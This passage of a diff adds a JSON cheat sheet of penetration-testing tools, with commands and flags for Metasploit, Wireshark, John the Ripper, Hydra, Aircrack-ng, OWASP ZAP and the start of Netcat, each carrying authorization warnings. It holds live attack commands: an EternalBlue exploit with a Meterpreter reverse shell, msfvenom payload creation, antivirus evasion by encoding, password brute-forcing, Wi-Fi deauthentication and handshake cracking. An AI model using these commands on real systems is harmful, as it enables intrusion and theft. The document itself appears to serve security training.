+            "Performance": "Use \"Full and fast\" scans for routine checks; \"Full and very deep\" only when needed, as it is resource-heavy.",
+            "Scoping": "Define scan targets carefully to avoid accidental scanning of unauthorized systems.",
+            "Reporting": "Export reports in PDF, XML, or CSV formats for compliance or auditing.",
+            "Automation": "Combine gvm-cli with cron jobs to automate periodic scans."
+        },
+        "advanced": {
+            "advanced_tips": [
+                "Integrate OpenVAS with SIEM solutions (Splunk, ELK, QRadar) for centralized logging and alerting.",
+                "Use gvmd CLI with XML commands to fully automate scan creation, execution, and report retrieval.",
+                "Set up scheduled scans (daily, weekly, monthly) to maintain continuous vulnerability monitoring.",
+                "Leverage custom scan configurations to focus only on certain ports, CVEs, or services.",
+                "Export scan results in machine-readable XML for integration into ticketing systems (Jira, ServiceNow).",
+                "Combine with OpenVAS Manager APIs to orchestrate scans across multiple scanners for enterprise scale."
+            ],
+            "tips": [
+                "Tune timeouts and parallelism in scan configs for better performance on large networks.",
+                "Whitelist scanning IPs in firewalls/IDS to avoid false alerts or blocking.",
+                "Use multiple scanners to distribute load across large environments.",
+                "Correlate OpenVAS results with manual penetration testing for higher accuracy.",
+                "Regularly compare OpenVAS reports with other scanners (Nessus, Nexpose) for broader coverage."
+            ]
+        }
+    },
+    {
+        "name": "Metasploit Framework",
+        "description": "Metasploit is a comprehensive penetration testing framework offering a suite of exploits, payloads, auxiliary modules, and post-exploitation tools for security testing across multiple platforms including Windows, Linux, macOS, and network devices. It is widely used in ethical hacking, red teaming, and security research to validate vulnerabilities and simulate real-world attacks.",
+        "when_why": "Use Metasploit when performing exploitation and post-exploitation phases of a security assessment. It helps to:\n- Validate discovered vulnerabilities safely.\n- Simulate realistic attacks to assess system resilience.\n- Perform privilege escalation and lateral movement within a network.\n- Test payload effectiveness and intrusion detection responses.\nAlways use in a controlled lab environment or on systems with explicit permission.",
+        "how": "Step-by-step usage example:\n1. Launch Metasploit Framework in quiet mode:\n`msfconsole -q`\n\n2. Search for relevant modules:\n`search smb`\n(Lists exploits, auxiliary scanners, and payloads related to SMB.)\n\n3. Select an exploit module:\n`use exploit/windows/smb/ms17_010_eternalblue`\n\n4. Configure the target and payload options:\n`set RHOSTS 192.168.1.101`\n`set LHOST 192.168.1.50`\n`set PAYLOAD windows/meterpreter/reverse_tcp`\n\n5. Check if the target is vulnerable:\n`check`\n\n6. Run the exploit in background mode:\n`exploit -j`\n\n7. Post-exploitation:\n- Use `sessions -l` to list active sessions.\n- Interact with a session: `sessions -i <id>`.\n- Gather information with post modules, e.g., `use post/windows/gather/enum_users`.\n\n⚠️ Only test systems you own or have explicit permission to assess.",
+        "notes": "⚠️ Only scan or try networks and systems you own or are authorized to test.",
+        "flags": [
+            {
+                "flag": "set LHOST <IP>",
+                "explanation": "Sets the local (attacker) IP for reverse connections (e.g., 192.168.1.50). Why: Enables reverse shells to connect back to the attacker's machine."
+            },
+            {
+                "flag": "set RHOSTS <IP>",
+                "explanation": "Sets the target (remote) IP or range (e.g., 192.168.1.101). Why: Specifies the system to exploit."
+            },
+            {
+                "flag": "set PAYLOAD <payload>",
+                "explanation": "Selects the payload (e.g., windows/meterpreter/reverse_tcp). Why: Defines the code executed on the target after exploitation."
+            },
+            {
+                "flag": "exploit -j",
+                "explanation": "Runs the exploit in the background as a job. Why: Allows multitasking within msfconsole."
+            },
+            {
+                "flag": "-q",
+                "explanation": "Quiet mode for msfconsole startup. Why: Reduces verbose output for a cleaner interface."
+            },
+            {
+                "flag": "show options",
+                "explanation": "Displays configurable options for the selected module. Why: Ensures correct settings before running the exploit."
+            },
+            {
+                "flag": "check",
+                "explanation": "Tests if the target is vulnerable without executing the exploit. Why: Reduces risk of unintended impact during testing."
+            },
+            {
+                "flag": "set ENCODER <encoder>",
+                "explanation": "Encodes the payload to evade basic antivirus or intrusion detection systems (e.g., shikata_ga_nai)."
+            },
+            {
+                "flag": "set SESSION <id>",
+                "explanation": "Specifies which Meterpreter session to use for post-exploitation modules."
+            }
+        ],
+        "examples": [
+            {
+                "command": "msfconsole -q; use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.101; set LHOST 192.168.1.50; exploit",
+                "explanation": "Launches EternalBlue exploit against a Windows target with a reverse shell payload."
+            },
+            {
+                "command": "msfconsole -q; use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.0/24; run",
+                "explanation": "Performs a TCP port scan on a subnet to identify open ports."
+            },
+            {
+                "command": "msfconsole -q; use exploit/multi/http/struts2_rest_xstream; set RHOSTS 192.168.1.200; set TARGETURI /struts2-rest-showcase/orders; exploit",
+                "explanation": "Exploits a Struts2 vulnerability on a web server with a specific URI."
+            },
+            {
+                "command": "msfconsole -q; use post/windows/gather/enum_users; set SESSION 1; run",
+                "explanation": "Enumerates users on a compromised Windows system using an active session."
+            },
+            {
+                "command": "msfconsole -q; use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; run",
+                "explanation": "Scans a subnet for SMB services and their versions."
+            },
+            {
+                "command": "msfconsole -q; use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.50; exploit",
+                "explanation": "Sets up a listener to receive a Meterpreter session from a reverse shell payload."
+            },
+            {
+                "command": "msfconsole -q; use post/windows/manage/migrate; set SESSION 1; run",
+                "explanation": "Migrate Meterpreter to another process for stability and privilege escalation."
+            }
+        ],
+        "tips": {
+            "list_modules": "Use `search <keyword>` to find exploits, payloads, or auxiliary modules (e.g., `search smb`).",
+            "get_module_help": "Use `info` or `show info` to view detailed module documentation.",
+            "session_management": "List sessions with `sessions -l` and interact using `sessions -i <id>`.",
+            "payload_testing": "Always test payloads in a safe lab environment before using on live systems."
+        },
+        "advanced": {
+            "advanced_tips": [
+                "Use `set ENCODER <encoder>` to encode payloads (e.g., shikata_ga_nai) to bypass basic AV detection.",
+                "Leverage `auxiliary/scanner` modules for reconnaissance before exploitation.",
+                "Chain exploits with post-exploitation modules for lateral movement: `use post/windows/manage/migrate`.",
+                "Use `msfvenom` to generate custom payloads: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 -f exe > payload.exe`.",
+                "Combine `exploit/multi/handler` with reverse shells for receiving Meterpreter sessions from multiple targets.",
+                "Test modules with `check` before actual exploitation to minimize unintended impact."
+            ],
+            "tips": [
+                "List active sessions with `sessions -l`; interact with `sessions -i <id>`.",
+                "Use workspaces (`workspace -a <name>`) to organize targets and sessions.",
+                "Use `route` to pivot through compromised machines to reach internal networks.",
+                "Run auxiliary modules like scanners and sniffers to gather more context before exploitation.",
+                "Regularly update Metasploit database with `msfdb reinit` to access latest exploits and auxiliary modules."
+            ]
+        }
+    },
+    {
+        "name": "Wireshark",
+        "description": "Wireshark is a powerful network protocol analyzer for capturing, inspecting, and dissecting network packets in real-time or from saved captures. It supports hundreds of protocols and allows detailed analysis of packet headers, payloads, and protocol interactions. Widely used in network troubleshooting, security analysis, and educational labs.",
+        "when_why": "Use Wireshark when performing network troubleshooting, protocol analysis, or security assessments. It helps to:\n- Detect anomalies, unusual traffic, or suspicious behavior.\n- Identify potential data leaks or unencrypted sensitive traffic.\n- Monitor network performance and bottlenecks.\n- Understand protocol behavior for educational or forensic purposes.\nAlways capture traffic only on networks you own or have permission to monitor.",
+        "how": "GUI Usage:\n1. Launch Wireshark: `wireshark &`\n2. Select the network interface to capture from (e.g., eth0, wlan0).\n3. Apply display filters (e.g., `ip.src == 192.168.1.100` or `http.request.method == GET`).\n4. Analyze packets in detail by expanding protocol layers in the packet pane.\n5. Export packets or specific selections for reporting or offline analysis.\n\nCLI Usage with Tshark:\n1. Capture and save traffic: `tshark -i eth0 -f \"host 192.168.1.100\" -w capture.pcap`\n2. Read from a saved capture: `tshark -r capture.pcap -Y \"tcp.port == 443\" -T fields -e ip.src -e ip.dst`\n3. Limit capture: `tshark -i wlan0 -c 100 -f \"port 22\"` to capture only 100 SSH packets.\n4. Generate statistics: `tshark -r capture.pcap -z io,phs` for protocol hierarchy statistics.\nAlways work on authorized networks.",
+        "notes": "⚠️ Only capture traffic on networks and systems you own or are explicitly authorized to monitor.",
+        "flags": [
+            {
+                "flag": "-i <interface>",
+                "explanation": "Specifies the network interface to capture packets from (e.g., eth0, wlan0). Why: Targets the relevant traffic."
+            },
+            {
+                "flag": "-f <filter>",
+                "explanation": "Sets a capture filter using Berkeley Packet Filter syntax (e.g., \"host 192.168.1.100\"). Why: Limits captured data to relevant traffic for efficiency."
+            },
+            {
+                "flag": "-w <outfile>",
+                "explanation": "Saves captured packets to a file (e.g., capture.pcap). Why: Enables offline analysis or sharing."
+            },
+            {
+                "flag": "-r <infile>",
+                "explanation": "Reads packets from a saved capture file. Why: Allows reviewing past captures or forensic analysis."
+            },
+            {
+                "flag": "-Y <display filter>",
+                "explanation": "Applies a display filter in Tshark or GUI (e.g., `-Y \"http.request\"`). Why: Filters shown packets without affecting the capture process."
+            },
+            {
+                "flag": "-c <count>",
+                "explanation": "Limits capture to a set number of packets. Why: Prevents excessive data collection and memory overload."
+            },
+            {
+                "flag": "-z <statistics>",
+                "explanation": "Generates protocol statistics (e.g., `-z io,phs`). Why: Summarizes traffic patterns and helps quickly identify anomalies."
+            },
+            {
+                "flag": "-a duration:<seconds>",
+                "explanation": "Stops capturing after a specified duration. Why: Useful for timed captures in monitoring or lab exercises."
+            },
+            {
+                "flag": "-V",
+                "explanation": "Displays verbose output showing full packet details in CLI. Why: Useful for deep packet inspection."
+            }
+        ],
+        "examples": [
+            {
+                "command": "wireshark -i eth0 -k",
+                "explanation": "Launch GUI and immediately start capturing on eth0."
+            },
+            {
+                "command": "tshark -i wlan0 -f \"port 80\" -w http_traffic.pcap",
+                "explanation": "Capture HTTP traffic on wlan0 and save it to a file."
+            },
+            {
+                "command": "tshark -r capture.pcap -Y \"ip.src == 192.168.1.100\" -T fields -e ip.dst",
+                "explanation": "Extract destination IPs from captured packets with a specific source IP."
+            },
+            {
+                "command": "tshark -i eth0 -c 50 -f \"tcp port 22\"",
+                "explanation": "Capture 50 SSH packets for analysis."
+            },
+            {
+                "command": "wireshark -Y \"http.request.method == GET\"",
+                "explanation": "Filter GUI capture to only display HTTP GET requests."
+            },
+            {
+                "command": "tshark -i eth0 -a duration:60 -w capture_1min.pcap",
+                "explanation": "Capture packets for 60 seconds and save to a file."
+            },
+            {
+                "command": "tshark -r capture.pcap -z conv,tcp",
+                "explanation": "Analyze TCP conversations in a capture file for connection-level insights."
+            }
+        ],
+        "tips": {
+            "list_interfaces": "List interfaces: `tshark -D` or check available interfaces in the Wireshark GUI.",
+            "filter_help": "Access filter syntax: https://www.wireshark.org/docs/man-pages/wireshark-filter.html or use GUI autocomplete.",
+            "color_coding": "Use coloring rules to highlight traffic types (e.g., HTTP, DNS, suspicious packets) for faster visual analysis.",
+            "packet_export": "Export selected packets for reporting or sharing with `File > Export Specified Packets` in GUI."
+        },
+        "advanced": {
+            "advanced_tips": [
+                "Combine multiple filters: `ip.src == 192.168.1.100 && tcp.port == 443` for precise HTTPS analysis.",
+                "Use Tshark for large capture files to avoid GUI slowdown.",
+                "Apply protocol-specific filters to detect anomalies, e.g., `dns.flags.response == 1` to monitor DNS responses.",
+                "Perform expert analysis using Wireshark's 'Statistics' menu (IO graphs, flow graphs, protocol hierarchy).",
+                "Automate repetitive analysis using Tshark scripts or command-line pipelines."
+            ],
+            "tips": [
+                "Prefer capture filters (-f) over display filters (-Y) for large networks to reduce memory usage.",
+                "Limit packet count or capture duration for high-traffic environments.",
+                "Use naming conventions for capture files to keep multiple sessions organized.",
+                "Correlate Wireshark captures with other logs (firewall, IDS, system logs) for comprehensive analysis."
+            ]
+        }
+    },
+    {
+        "name": "John the Ripper",
+        "description": "John the Ripper is a fast, versatile password cracking tool designed to audit password strength. It supports a wide variety of hash types including MD5, SHA1, SHA256, SHA512, NTLM, and more. It combines dictionary attacks, brute-force, and rule-based attacks to recover passwords efficiently.",
+        "when_why": "Use John the Ripper during security audits to:\n- Test the strength of user passwords.\n- Recover lost passwords or test backups.\n- Identify weak credentials in systems and applications.\n- Enforce strong password policies by demonstrating vulnerabilities.\nAlways perform password audits on systems you own or are explicitly authorized to test.",
+        "how": "Basic wordlist attack:\n`john --format=sha512 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`\nExplanation:\n- `--format=<format>`: Specifies the hash type to crack.\n- `--wordlist=<file>`: Uses a predefined list of common passwords.\n- `hashes.txt`: File containing hashes to test.\n\nBrute-force attack:\n`john --format=sha1 --incremental hashes.txt`\n- Attempts all possible character combinations for complex passwords.\n\nMask attack:\n`john --format=sha512 --mask=?l?l?l?d?d --rules hashes.txt`\n- Targets passwords with known patterns to reduce keyspace and increase efficiency.\n\nParallel cracking:\n`john --format=nt --fork=8 --wordlist=/usr/share/wordlists/rockyou.txt nt_hashes.txt`\n- Leverages multiple CPU cores for faster cracking.\n\nShow cracked passwords:\n`john --show cracked_hashes.txt`\n- Displays previously cracked passwords without re-running the attack.\n\nAlways test on authorized systems only.",
+        "notes": "⚠️ Only test hashes from systems you own or have explicit permission to audit.",
+        "flags": [
+            {
+                "flag": "--format=<format>",
+                "explanation": "Specifies hash type (md5, sha512, nt, etc.). Why: Ensures accurate cracking for the target hash."
+            },
+            {
+                "flag": "--wordlist=<file>",
+                "explanation": "Uses a wordlist file. Why: Speeds up attacks using common passwords."
+            },
+            {
+                "flag": "--fork=<number>",
+                "explanation": "Runs multiple processes. Why: Maximizes CPU utilization for faster cracking."
+            },
+            {
+                "flag": "--incremental",
+                "explanation": "Brute-force attack with all possible character combinations. Why: Attempts complex passwords systematically."
+            },
+            {
+                "flag": "--mask=<mask>",
+                "explanation": "Uses a custom mask pattern (e.g., ?l?l?l?d). Why: Efficiently targets specific password patterns."
+            },
+            {
+                "flag": "--show",
+                "explanation": "Displays previously cracked passwords. Why: Retrieve results without re-running the attack."
+            },
+            {
+                "flag": "--rules",
+                "explanation": "Applies mangling rules to wordlist entries. Why: Catches variations like Password1 or password!."
+            },
+            {
+                "flag": "--restore",
+                "explanation": "Resumes a previously interrupted session. Why: Avoids losing progress on long-running attacks."
+            },
+            {
+                "flag": "--list=formats",
+                "explanation": "Lists all supported hash formats. Why: Helps choose the correct cracking mode."
+            }
+        ],
+        "examples": [
+            {
+                "command": "john --format=md5 --wordlist=/usr/share/wordlists/rockyou.txt md5_hashes.txt",
+                "explanation": "Cracks MD5 hashes using a common wordlist."
+            },
+            {
+                "command": "john --format=sha1 --incremental hashes.txt",
+                "explanation": "Performs a brute-force attack on SHA1 hashes."
+            },
+            {
+                "command": "john --format=nt --fork=8 --wordlist=/usr/share/wordlists/rockyou.txt nt_hashes.txt",
+                "explanation": "Cracks NTLM hashes using 8 parallel processes."
+            },
+            {
+                "command": "john --format=sha512 --mask=?l?l?l?d?d --rules hashes.txt",
+                "explanation": "Uses a custom mask with rules for SHA512 hash cracking."
+            },
+            {
+                "command": "john --show cracked_hashes.txt",
+                "explanation": "Displays cracked passwords from a previous session."
+            },
+            {
+                "command": "john --format=sha256 --wordlist=custom_list.txt hashes.txt",
+                "explanation": "Use a custom wordlist to test SHA256 hashes."
+            },
+            {
+                "command": "john --restore",
+                "explanation": "Resume an interrupted cracking session."
+            }
+        ],
+        "tips": {
+            "list_formats": "List all supported hash formats: `john --list=formats`.",
+            "custom_wordlist": "Create custom wordlists using tools like `crunch` or `cewl` for targeted attacks.",
+            "resume_session": "Resume long-running or interrupted sessions with `john --restore`.",
+            "optimize_performance": "Use `--fork` matching CPU cores for maximum efficiency."
+        },
+        "advanced": {
+            "advanced_tips": [
+                "Combine `--wordlist` with `--rules` to test variations efficiently.",
+                "Use `--mask` to reduce keyspace for targeted brute-force attacks.",
+                "Leverage GPU acceleration with tools like `hashcat` for compatible hashes.",
+                "Chain incremental and mask attacks to cover a wider range of passwords."
+            ],
+            "tips": [
+                "Extract password hashes safely from authorized systems using tools like `pwdump` or `samdump2`.",
+                "Keep wordlists organized and filtered to optimize cracking time.",
+                "Use logging options (`--pot`) to store cracked passwords for audit reporting."
+            ]
+        }
+    },
+    {
+        "name": "Hydra",
+        "description": "Hydra is a high-performance network logon cracker that supports numerous protocols including SSH, FTP, HTTP(S), SMB, RDP, SMTP, and more. It performs rapid dictionary and brute-force attacks to test credentials, helping security auditors identify weak, default, or compromised passwords.",
+        "when_why": "Use Hydra during security assessments to:\n- Identify weak or default passwords on network services.\n- Test password policies and access controls.\n- Validate multi-user authentication resilience.\nAlways run Hydra only on systems you own or have explicit permission to test.",
+        "how": "Basic SSH attack:\n`hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 192.168.1.100 ssh`\nExplanation:\n- `-l admin`: single target username.\n- `-P rockyou.txt`: password list.\n- `-t 4`: number of parallel threads.\n- `ssh`: target protocol.\n\nWeb login brute-force:\n`hydra -L users.txt -P passwords.txt -t 8 192.168.1.200 http-post-form \"/login:username=^USER^&password=^PASS^:Invalid\"`\n- Targets a web form by specifying the failure message.\n\nCustom port & verbose:\n`hydra -l user -P /usr/share/wordlists/rockyou.txt -s 2222 192.168.1.100 ssh -V`\n- Tests non-standard SSH ports with real-time monitoring.\n\nSave results:\n`hydra -l guest -P passwords.txt -o ftp_results.txt 192.168.1.50 ftp`\n- Saves successful credentials for reporting and review.\n\nAlways use responsibly on authorized systems.",
+        "notes": "⚠️ Only scan or try networks and systems you own or are authorized to test.",
+        "flags": [
+            {
+                "flag": "-t <number>",
+                "explanation": "Sets parallel tasks. Why: Balances speed and risk of detection or account lockouts."
+            },
+            {
+                "flag": "-l <username>",
+                "explanation": "Single username target. Why: Focuses the attack on a specific account."
+            },
+            {
+                "flag": "-L <file>",
+                "explanation": "Username list. Why: Tests multiple usernames efficiently."
+            },
+            {
+                "flag": "-P <file>",
+                "explanation": "Password list. Why: Enables testing of multiple passwords efficiently."
+            },
+            {
+                "flag": "-o <file>",
+                "explanation": "Save successful credentials to a file. Why: Useful for auditing and reporting."
+            },
+            {
+                "flag": "-V",
+                "explanation": "Verbose mode. Why: Displays every attempt for monitoring progress."
+            },
+            {
+                "flag": "-s <port>",
+                "explanation": "Custom service port. Why: Targets services on non-standard ports."
+            },
+            {
+                "flag": "-w <seconds>",
+                "explanation": "Delay between attempts. Why: Avoids triggering account lockouts or IDS alerts."
+            },
+            {
+                "flag": "-R",
+                "explanation": "Resume interrupted sessions. Why: Avoids restarting long scans from scratch."
+            },
+            {
+                "flag": "-m <module>",
+                "explanation": "Specify custom web parameters or failure strings. Why: Essential for HTTP(S) form attacks."
+            }
+        ],
+        "examples": [
+            {
+                "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 192.168.1.100 ssh",
+                "explanation": "SSH brute-force for 'admin' using 4 threads."
+            },
+            {
+                "command": "hydra -L users.txt -P passwords.txt -t 8 192.168.1.200 http-post-form \"/login:username=^USER^&password=^PASS^:Invalid\"",
+                "explanation": "Web login brute-force using username and password lists with HTTP POST form."
+            },
+            {
+                "command": "hydra -l user -P /usr/share/wordlists/rockyou.txt -s 2222 192.168.1.100 ssh -V",
+                "explanation": "SSH brute-force on non-standard port 2222 with verbose output."
+            },
+            {
+                "command": "hydra -l guest -P passwords.txt -o ftp_results.txt 192.168.1.50 ftp",
+                "explanation": "FTP brute-force and save results to file."
+            },
+            {
+                "command": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 2 192.168.1.10 smb -w 3",
+                "explanation": "SMB brute-force using username list, 2 threads, and 3-second delay."
+            },
+            {
+                "command": "hydra -R",
+                "explanation": "Resume an interrupted Hydra session without starting over."
+            }
+        ],
+        "tips": {
+            "list_protocols": "Check supported protocols: `hydra -h`.",
+            "custom_wordlists": "Generate targeted wordlists with `cewl` or `crunch` to improve efficiency.",
+            "resume_session": "Use `-R` to resume long-running or interrupted scans.",
+            "optimize_threads": "Set `-t` based on system and network capacity to avoid overload or detection."
+        },
+        "advanced": {
+            "advanced_tips": [
+                "Use low thread counts (-t) for sensitive systems to reduce detection risk.",
+                "Add delays (-w) between attempts for stealthier testing.",
+                "Target specific usernames (-l) to minimize attack footprint.",
+                "Combine Hydra with proxy tools like Burp Suite for web login fuzzing.",
+                "Leverage multiple protocols in sequence (SSH, FTP, HTTP) to test multi-service authentication resilience."
+            ],
+            "tips": [
+                "Use `-m` for custom HTTP(S) form parameters and failure strings.",
+                "Log output regularly (`-o`) to track successful credentials and avoid losing results.",
+                "Always respect authorization boundaries and legal constraints when testing."
+            ]
+        }
+    },
+    {
+        "name": "Aircrack-ng",
+        "description": "Aircrack-ng is a comprehensive suite for Wi-Fi security auditing, including monitoring, packet capturing, injection, deauthentication, and cracking WEP, WPA, and WPA2 encryption. It is widely used for penetration testing and wireless network security assessments.",
+        "when_why": "Use Aircrack-ng during wireless assessments to:\n- Evaluate encryption strength of Wi-Fi networks.\n- Test password robustness and recovery methods.\n- Identify vulnerabilities such as weak keys or misconfigured networks.\nAlways test on networks you own or have explicit permission to audit.",
+        "how": "Step-by-step example:\n1. Enable monitor mode:\n`airmon-ng start wlan0`\n- Creates wlan0mon interface for packet capture.\n2. Capture packets from target AP:\n`airodump-ng wlan0mon --bssid 00:11:22:33:44:55 -c 6 -w capture`\n- Filters traffic to the specific AP on channel 6, saving packets to 'capture'.\n3. Force clients to reconnect (generate handshake):\n`aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon`\n- Sends deauth packets to capture WPA/WPA2 handshake.\n4. Crack the password:\n`aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 capture.cap`\n- Uses a wordlist to try cracking the captured handshake.\n\nAlways ensure Wi-Fi adapter supports monitor mode and packet injection, and only test authorized networks.",
+        "notes": "⚠️ Only scan or try networks and systems you own or are authorized to test.",
+        "flags": [
+            {
+                "flag": "-0 <count>",
+                "explanation": "Sends deauthentication packets (e.g., -0 5). Why: Forces clients to reconnect to capture handshakes."
+            },
+            {
+                "flag": "-w <file>",
+                "explanation": "Specifies output capture filename (airodump-ng) or wordlist (aircrack-ng). Why: Stores packets or passwords for analysis."
+            },
+            {
+                "flag": "-b <BSSID>",
+                "explanation": "Target a specific AP by MAC. Why: Focuses capture or cracking on one network."
+            },
+            {
+                "flag": "-a <AP_MAC>",
+                "explanation": "Deauth packets target AP MAC. Why: Ensures correct AP is attacked."
+            },
+            {
+                "flag": "--bssid <BSSID>",
+                "explanation": "Filters capture by AP MAC in airodump-ng. Why: Reduces noise from other networks."
+            },
+            {
+                "flag": "-c <channel>",
+                "explanation": "Set Wi-Fi channel (e.g., -c 6). Why: Captures traffic only on the correct AP channel."
+            },
+            {
+                "flag": "--essid <SSID>",
+                "explanation": "Filter capture by SSID name. Why: Focuses on a specific wireless network."
+            },
+            {
+                "flag": "--ivs",
+                "explanation": "Save only WEP IVS packets for faster cracking. Why: Reduces capture size and speeds up WEP cracking."
+            }
+        ],
+        "examples": [
+            {
+                "command": "airmon-ng start wlan0",
+                "explanation": "Enable monitor mode on wlan0, creating wlan0mon interface."
+            },
+            {
+                "command": "airodump-ng wlan0mon --bssid 00:11:22:33:44:55 -c 6 -w capture",
+                "explanation": "Capture packets from a specific AP on channel 6."
+            },
+            {
+                "command": "aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon",
+                "explanation": "Send 5 deauth packets to force client reconnections."
+            },
+            {
+                "command": "aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 capture.cap",
+                "explanation": "Crack WPA/WPA2 key from captured handshake using a wordlist."
+            },
+            {
+                "command": "airodump-ng wlan0mon --essid 'MyWiFi' -w wifi_capture",
+                "explanation": "Capture packets filtered by SSID name, saving to 'wifi_capture'."
+            }
+        ],
+        "tips": {
+            "check_interfaces": "List wireless interfaces: `airmon-ng` or `iwconfig`.",
+            "verify_monitor_mode": "Confirm monitor mode: `iwconfig wlan0mon`.",
+            "wordlist_source": "Use strong wordlists like rockyou.txt or generate custom ones with `crunch` or `cewl`.",
+            "handshake_verification": "Check if handshake captured: `aircrack-ng capture.cap` before attempting full crack."
+        },
+        "advanced": {
+            "advanced_tips": [
+                "Use `airmon-ng check kill` to terminate interfering processes before starting monitor mode.",
+                "Capture on the correct channel (-c) to avoid missing target handshakes.",
+                "Increase deauth packets (-0 <count>) if clients are not reconnecting, but avoid excessive disruption.",
+                "Combine Aircrack-ng with tools like Wireshark to analyze handshake capture quality.",
+                "Use GPU-accelerated cracking tools (e.g., hashcat) for faster WPA/WPA2 password recovery."
+            ],
+            "tips": [
+                "Ensure your wireless adapter supports monitor mode and packet injection (e.g., Atheros AR9271, Ralink RT3070).",
+                "Validate handshake files before cracking to avoid wasting time.",
+                "Use multiple capture points if clients roam across channels or APs."
+            ]
+        }
+    },
+    {
+        "name": "OWASP ZAP",
+        "description": "OWASP ZAP (Zed Attack Proxy) is a GUI-based open-source web application security scanner. It identifies vulnerabilities such as XSS, SQL injection, CSRF, directory traversal, and misconfigurations. Supports automated scanning, spidering, proxying, and scripting for comprehensive web security testing.",
+        "when_why": "Use OWASP ZAP during web app penetration testing to:\n- Detect common vulnerabilities in web applications.\n- Validate security fixes and monitor regressions.\n- Audit applications in CI/CD pipelines with automation.\nIdeal for developers, security testers, and professionals in controlled environments.",
+        "how": "1. Launch GUI: `zap.sh` or on Windows `zap.bat`.\n2. Configure browser proxy to 127.0.0.1:8080 to intercept traffic.\n3. Spider the target website to discover URLs (e.g., http://192.168.1.100).\n4. Run Active Scan for automated vulnerability detection.\n5. For CLI automation:\n`zap.sh -cmd -quickurl http://192.168.1.100 -quickout report.xml`\n- Scans a URL quickly and saves results.\n6. Resume sessions with `-session <file>` to continue previous scans.\nAlways test only applications you own or have explicit permission to scan.",
+        "notes": "⚠️ Only scan or try networks and systems you own or are authorized to test.",
+        "flags": [
+            {
+                "flag": "-cmd",
+                "explanation": "Runs ZAP in command-line mode and exits after completion. Why: Useful for scripting and CI/CD automation."
+            },
+            {
+                "flag": "-quickurl <URL>",
+                "explanation": "Scans a single URL. Why: Quick and targeted scanning without launching GUI."
+            },
+            {
+                "flag": "-config <key=value>",
+                "explanation": "Set configuration options (e.g., scanner.maxChildren=10). Why: Customize scan behavior such as depth or thread count."
+            },
+            {
+                "flag": "-quickout <file>",
+                "explanation": "Saves scan report to a file. Why: Stores results in formats like XML, HTML, or JSON for analysis."
+            },
+            {
+                "flag": "-port <port>",
+                "explanation": "Set the proxy port (default 8080). Why: Allows using custom ports to avoid conflicts."
+            },
+            {
+                "flag": "-silent",
+                "explanation": "Minimal output mode. Why: Reduces verbosity for automated scans or scripts."
+            },
+            {
+                "flag": "-session <file>",
+                "explanation": "Load a saved session. Why: Resume previous scans with existing context or URLs."
+            },
+            {
+                "flag": "-addoninstall <addon>",
+                "explanation": "Install ZAP add-ons from CLI. Why: Extend ZAP capabilities without GUI."
+            },
+            {
+                "flag": "-daemon",
+                "explanation": "Run ZAP in daemon mode. Why: Supports remote API access and background scanning."
+            }
+        ],
+        "examples": [
+            {
+                "command": "zap.sh -cmd -quickurl http://192.168.1.100 -quickout zap_report.xml",
+                "explanation": "Quick CLI scan on a URL with XML report output."
+            },
+            {
+                "command": "zap.sh -port 8081 -cmd -quickurl https://testapp.local",
+                "explanation": "Scan URL with a custom proxy port."
+            },
+            {
+                "command": "zap.sh -config scanner.maxChildren=5 -quickurl http://192.168.1.100",
+                "explanation": "Limit spider depth for faster results."
+            },
+            {
+                "command": "zap.sh -cmd -session previous_scan.session -quickout report.html",
+                "explanation": "Resume a saved session and export report in HTML."
+            },
+            {
+                "command": "zap.sh -silent -quickurl http://localhost:8080 -quickout silent_report.json",
+                "explanation": "Perform a silent scan and save results in JSON."
+            }
+        ],
+        "tips": {
+            "proxy_setup": "Set browser proxy to 127.0.0.1:8080 to intercept traffic; use ZAP’s built-in browser for convenience.",
+            "api_access": "Enable ZAP API with `-config api.key=YOUR_KEY` for CI/CD automation or integration with other tools.",
+            "custom_scripts": "Use ZAP’s script console to add custom passive or active scanning rules.",
+            "context_scanning": "Define contexts to scan only specific domains and URLs, reducing false positives."
+        },
+        "advanced": {
+            "advanced_tips": [
+                "Limit scan scope with `-config scanner.scope=URL` to target specific endpoints.",
+                "Adjust scan strength using `-config scanner.strength=LOW|MEDIUM|HIGH` to control aggressiveness.",
+                "Enable AJAX Spider for modern dynamic web apps via GUI: `Tools > AJAX Spider`.",
+                "Automate full CI/CD scans using Docker: `docker run -t owasp/zap2docker-stable zap.sh -cmd`.",
+                "Integrate ZAP API with Python or Jenkins pipelines for scheduled automated testing."
+            ],
+            "tips": [
+                "Export reports in multiple formats (HTML, XML, JSON) for documentation and stakeholder review.",
+                "Combine ZAP with Burp Suite for manual testing alongside automated scanning.",
+                "Regularly update ZAP and its add-ons for the latest vulnerability detection."
+            ]
+        }
+    },
+    {
+        "name": "Netcat",
+        "description": "Netcat (nc) is a versatile networking utility for TCP/UDP connections, capable of port scanning, banner grabbing, file transfer, and acting as a simple backdoor in controlled testing environments. It is often called the 'Swiss Army knife' of networking.",
+        "when_why": "Use Netcat for:\n- Testing open ports and listening services.\n- Transferring files between hosts.\n- Debugging network services.\n- Setting up temporary chat servers or reverse shells.\nOnly use on systems and networks you own or are authorized to test.",
+        "how": "1. Set up a listener on the local machine:\n`nc -lvnp 4444`\n- `-l`: listen mode\n- `-v`: verbose output\n- `-n`: skip DNS resolution\n- `-p 4444`: specify port\n\n2. Connect from a remote host:\n`nc 192.168.1.50 4444`\n- Initiates a connection to the listener.\n\n3. Transfer files:\nSender: `nc -w 3 192.168.1.50 5555 < file.txt`\nReceiver: `nc -l -p 5555 > file.txt`\n\n4. Test port scanning:\n`nc -zv 192.168.1.100 20-100`\n- `-z`: zero-I/O mode, used for scanning ports.\n- `-v`: verbose to see open ports.\n\nAlways test on authorized systems.",
